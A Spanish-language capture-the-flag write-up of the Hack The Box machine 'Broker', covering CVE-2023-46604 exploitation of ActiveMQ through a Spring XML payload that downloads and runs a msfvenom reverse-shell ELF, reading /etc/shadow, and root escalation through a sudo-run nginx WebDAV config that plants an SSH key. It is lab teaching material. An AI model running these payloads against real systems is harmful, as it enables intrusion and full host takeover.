---
layout: single
title: Broker - Hack The Box
excerpt: "Una maquina sencilla que implica una vulnerabilidad bastante reciente"
date: 2024-04-01
classes: wide
header:
  teaser: /assets/images/htb-monteverde/monteverde1.png
categories:
  - hackthebox
  - writeup
tags:
  - hackthebox
  - Linux
  - ActiveMq 
  - nginx
---

# Enumeración inicial

```bash
:$ sudo nmap -Pn -n -vvv -p- --open -sS 10.10.11.243 --min-rate 5000 -sCV
PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http        syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
81/tcp    open  http        syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-ls: Volume /
|   maxfiles limit reached (10)
| SIZE    TIME               FILENAME
| -       06-Nov-2023 01:10  bin/
| -       06-Nov-2023 01:10  bin/X11/
| 963     17-Feb-2020 14:11  bin/NF
...
61616/tcp open  apachemq    syn-ack ttl 63 ActiveMQ OpenWire transport
| fingerprint-strings:
|   NULL:
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
...
|_    5.15.15
```

> Q.¿En que puerto corre el servicio ActiveMQ?  
> A. Puerto 61616  

> Q. Cúal es la version del servicio ActiveMQ que corre en la máquina?  
> A. La 5.15.15  

- Aparte hay un montón de puertos en los que se comparte el sistema de archivos entero  
- Intento descargar algunos archivos de linux (`/etc/shadow`, `/etc/passwd`), correr el comando `unshadow` y crackear el hash, pero fracasamos.  

```bash
$: curl -s http://10.10.11.243:81/etc/shadow | grep -E "activemq|root" > shadow
root:$y$j9T$iDBjbum43YnvVKbOLNqgQ0$S0vmvHYH4M69yMjRUw2ioBEN6ElqehZQud6Lr/IQnJC:19720:0:99999:7:::
activemq:$y$j9T$5eMce1NhiF0t9/ZVwn39P1$pCfvgXtARGXPYDdn2AVdkCnXDf7YO7He/x666g6qLM5:19666:0:99999:7:::
$: curl -s http://10.10.11.243:81/etc/passwd | grep -E "activemq|root" > passwd
root:x:0:0:root:/root:/bin/bash
activemq:x:1000:1000:,,,:/home/activemq:/bin/bash
$: unshadow passwd shadow > shadowed
```

-------------------------------------

### ¿Que es active MQ?

Es internet nos lo definen como un broker de mensajes (al principio creia que se trataba de un chat, pero leyendo más me di cuenta que no)  

Con mensajes nos referimos a la trasnferencia de datos estrcuturados (XML, JSON u objetos serializados) para que aplicaciones se comuniquen entre si. 
El broker de mensajes, (`ActiveMQ`), actúa como un intermediario que facilita y gestiona dicha comunicación (enruta mensajes de una aplicación a 
otra y adapta el formato del mensaje para que le sea legible)

Si una aplicación Cliente utiliza Java como lenguaje, se comunica con el broker ActiveMQ por el protocolo `OpenWire`, mediante datos en binario

- Información extraida de [attackerkb](https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604/rapid7-analysis)

### CVE-2023-46604

Este protocolo `OpenWire` escucha por defecto en el puerto `61616` para pasarle los datos recibidos a `ActiveMQ`. Este componente, es el vulnerable
a un RCE (ejecución arbitraria de comandos) mediante un archivo XML especialmente diseñado para ello.

-------------------------------------

# Explotando Active MQ

Buscamos la vulnerabilidad respecto a esta versión de ActiveMQ, encontramos el CVE-2023-46604, que es un RCE.  

> Q. ¿Cual es el codigo CVE de la vulnerabilidad de "Ejecucion Remota de Comandos" del ActiveMQ?  
> A. CVE-2023-46604  

Encontramos un exploit en [github](https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ)  

```bash
$: git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ
Cloning into 'CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ'...
remote: Enumerating objects: 20, done.
remote: Counting objects: 100% (20/20), done.
...
$: cd CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ
```

En el exploit nos muestran que hay que crear un ejecutable de linux (`.elf`) con metasploit que entable una reverse shell. 
Introducimos la IP de kali y el puerto en el que escucharemos por netcat. Todo lo haremos desde el directoiro del Exploit  

```bash
$: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.102 LPORT=443 -f elf > shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

Tambien nos comparten un par de `xmls` para Linux y Windows. Retocamos la IP y el puerto, mas el nombre del binario.

```bash
$: vim poc-linux.xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
        <list>
            <value>sh</value>
            <value>-c</value>
            <!-- The command below downloads the file and saves it as test.elf -->
            <value>curl -s -o shell.elf http://10.10.14.102:8080/shell.elf; chmod +x ./shell.elf; ./shell.elf</value>
        </list>
        </constructor-arg>
    </bean>
</beans>
```
En cuanto al archivo `main.go` simplemente le manda un paquete en binario que pide al broker solicitarnos el XML malicioso (el cual tendremos que 
servir en un servidor de python). Corremos el exploit y ganamos la reverse shell.

```bash
$: sudo go run ./main.go -i 10.10.11.243 -p 61616 -u http://10.10.14.102:8080/poc-linux.xml
     _        _   _           __  __  ___        ____   ____ _____
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

[*] Target: 10.10.11.243:61616
[*] XML URL: http://10.10.14.102:8080/poc-linux.xml

[*] Sending packet: 000000791f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e74657874
2e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010026687474703a2f2f31302e31302e
31342e3130323a383038302f706f632d6c696e75782e786d6c
 
$: sudo python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.11.243 - - [03/Jan/2024 13:19:16] "GET /poc-linux.xml HTTP/1.1" 200 -
10.10.11.243 - - [03/Jan/2024 13:19:16] "GET /poc-linux.xml HTTP/1.1" 200 -
10.10.11.243 - - [03/Jan/2024 13:19:16] "GET /shell.elf HTTP/1.1" 200 -

$: sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.102] from (UNKNOWN) [10.10.11.243] 37968
id
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
```

> Q. Que usaurio (daemon) es el que corre ActiveMQ?   
> A. activemq  

----------------------

# Escalada de privilegios con nginx

Hacemos un tratamiento de la tty con los comandos 

```bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
activemq@broker:/opt/apache-activemq-5.15.15/bin$ ^Z
$: stty raw -echo; fg
reset xterm
activemq@broker:/opt/apache-activemq-5.15.15/bin$ stty rows 11 columns 119
activemq@broker:/opt/apache-activemq-5.15.15/bin$ export TERM=xterm
activemq@broker:/opt/apache-activemq-5.15.15/bin$ export SHELL=/bin/bash
activemq@broker:/opt/apache-activemq-5.15.15/bin$ ls
activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo -l
 Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty
 User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```
Como podemos ejecutar nginx como root, la manera de escalar privilegios será crear un servidor con altos privilegios del que abusar (nos permite leer y escribir archivos como si fueramos root)

Creamos un archivo `nginx` que codificamos en base64 para trasnferirlo a la máquina cómodamente

```bash
$: cat nginx
user root;
events { worker_connections 1024; }
http { server {
        listen 666; root /; autoindex on; dav_methods PUT; }}
$: cat nginx | base64 -w0 > nginx 
```
- `user root;` El proceso de nginx correrá bajo el usaurio root
- `events { worker_connections 1024; }` El servidor soportará un máximo de 1024 conexiones, es decir, clientes.
- `http { server {`: configuraciones de HTTP y el servidor
  - `listen 666;` se levantará el servidor por el puerto de la bestia
  - `root /;` montará todo el sistema desde la raiz
  - `autoindex on;`: muestra la lista de archivos (o sea la raiz) ya que no hay un `index.html`
  - `dav_methods PUT;` permite la subida de archivos con el método PUT

> Q. ¿Qué directiva nginx se puede utilizar para definir métodos WebDAV permitidos?  
> A. dav_methods  

> Q. ¿Qué indicador se utiliza para establecer una configuración nginx personalizada especificando un archivo?  
> A. -c   


```bash
activemq@broker:/dev/shm$ echo "dXNlciByb290OwpldmVudHMgeyB3b3JrZXJfY29ubmVjdGlvbnMgMTAyNDsgfQpodHRwIHsgc2VydmVyIHsKICAgICAgICBsaXN0ZW4gNjY2OyByb290IC87IGF1dG9pbmRleCBvbjsgZGF2X21ldGhvZHMgUFVUOwp9fQo=" | base64 -d > nginx
activemq@broker:/dev/shm$ sudo nginx -c /dev/shm/nginx
activemq@broker:/dev/shm$ curl -s http://localhost:666
<html>
<head><title>Index of /</title></head>
<body>
<h1>Index of /</h1><hr><pre><a href="../">../</a>
<a href="bin/">bin/</a>                                               06-Nov-2023 01:10                   -
<a href="boot/">boot/</a>                                              06-Nov-2023 01:38                   -
<a href="dev/">dev/</a>                                               22-Dec-2023 04:17                   -
...
```
Todos esos puertos abiertos con el sistema de archivos (como el del puerto 81) eran explotaciones previas por parte de otras personas.
Creamos con kali un par de llaves en el directorio actial de trabajo:

> Q. ¿Qué método HTTP se utiliza para escribir archivos mediante el protocolo WebDAV?  
> A. PUT  

```bash
$: ssh-keygen -t rsa -b 1024 -f broker
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
...
$: cat broker.public
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQCy4VJoDJuhu1wW6EReCT1XZ59qxtU597O8oYFNQ5zzLpLz/wo8qVgQjWj54KEM1jS7AoWZV2mBJ2N8O6IkTpll8IQdcK8avtX5ad4CJqFlz1jz7pIWpbP2k/XEVge6mCxaSYMA6hNLuQMOj7opYgz3rbxEGj+2MYlbFDMNnSywUQ== jessica@kali

activemq@broker:/dev/shm$ curl -X PUT localhost:666/root/.ssh/authorized_keys -d 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQCy4VJoDJuhu1wW6EReCT1XZ59qxtU597O8oYFNQ5zzLpLz/wo8qVgQjWj54KEM1jS7AoWZV2mBJ2N8O6IkTpll8IQdcK8avtX5ad4CJqFlz1jz7pIWpbP2k/XEVge6mCxaSYMA6hNLuQMOj7opYgz3rbxEGj+2MYlbFDMNnSywUQ== jessica@kali'

$: ssh -i ./broker root@10.10.11.243
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
Last login: Wed Jan  3 10:18:41 2024 from 127.0.0.1
root@broker:~# whoami
root
```
